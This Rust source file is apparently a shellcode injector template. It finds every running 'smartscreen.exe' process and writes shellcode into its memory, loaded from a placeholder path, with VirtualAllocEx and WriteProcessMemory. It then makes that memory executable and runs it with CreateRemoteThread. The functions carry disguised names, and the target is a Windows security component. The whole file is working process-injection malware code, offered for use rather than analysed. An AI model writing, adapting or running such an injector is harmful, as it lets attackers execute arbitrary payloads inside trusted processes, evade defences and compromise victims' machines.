use sysinfo::{PidExt, ProcessExt, System, SystemExt};
use windows::Win32::System::Diagnostics::Debug::WriteProcessMemory;
use windows::Win32::System::Memory::VirtualAllocEx;
use windows::Win32::System::Memory::VirtualProtectEx;
use windows::Win32::System::Memory::{MEM_COMMIT, PAGE_EXECUTE_READ, PAGE_READWRITE};
use windows::Win32::System::Threading::CreateRemoteThread;
use windows::Win32::System::Threading::OpenProcess;
use windows::Win32::System::Threading::PROCESS_ALL_ACCESS;
use std::include_bytes;

fn boxboxbox(tar: &str) -> Vec<u32> {
    // search for processes to inject into
    let mut dom: Vec<u32> = Vec::new();
    let s = System::new_all();
    for pro in s.processes_by_exact_name(tar) {
        //println!("{} {}", pro.pid(), pro.name());
        dom.push(pro.pid().as_u32());
    }
    return dom;
}

fn enhance(buf: &[u8], tar: &u32) {
    // injecting in target processes :)

    unsafe {
        let h_process = OpenProcess(PROCESS_ALL_ACCESS, false, *tar).unwrap();
        let result_ptr = VirtualAllocEx(h_process, None, buf.len(), MEM_COMMIT, PAGE_READWRITE);
        let mut byteswritten = 0;
        let _resb = WriteProcessMemory(
            h_process,
            result_ptr,
            buf.as_ptr() as _,
            buf.len(),
            Some(&mut byteswritten),
        );
        let mut old_perms = PAGE_EXECUTE_READ;
        let _bool = VirtualProtectEx(
            h_process,
            result_ptr,
            buf.len(),
            PAGE_EXECUTE_READ,
            &mut old_perms,
        );
        let _res_crt = CreateRemoteThread(
            h_process,
            None,
            0,
            Some(std::mem::transmute(result_ptr)),
            None,
            0,
            None,
        )
        .unwrap();
    }
}

fn main() {
    // inject in the following processes:
    let tar: &str = "smartscreen.exe";

    let buf = include_bytes!({{PATH_TO_SHELLCODE}});
    let list: Vec<u32> = boxboxbox(tar);
    if list.len() == 0 {
        panic!("[-] Unable to find a process.")
    } else {
        for i in &list {
            enhance(buf, i);
        }
    }
}
